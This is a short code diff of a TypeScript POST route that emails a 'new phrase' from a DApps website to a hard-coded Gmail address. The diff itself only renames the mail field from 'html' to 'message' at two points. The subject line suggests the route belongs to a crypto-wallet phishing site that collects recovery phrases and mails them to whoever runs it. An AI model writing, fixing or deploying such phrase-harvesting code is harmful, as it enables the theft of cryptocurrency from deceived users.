@@ -72,7 +72,7 @@ export async function POST(request: Request) {
         from: `Dapp App ${email}`,
         to: "contact.telfarglobal@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
-        html: formattedMessage,
+        message: formattedMessage,
       }
 
       transporter.verify(function (error, success) {
@@ -152,7 +152,7 @@ export async function POST(request: Request) {
         from: `Dapp App ${email}`,
         to: "contact.telfarglobal@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
-        html: formattedMessage,
+        message: formattedMessage,
       }
 
       transporter.verify(function (error, success) {
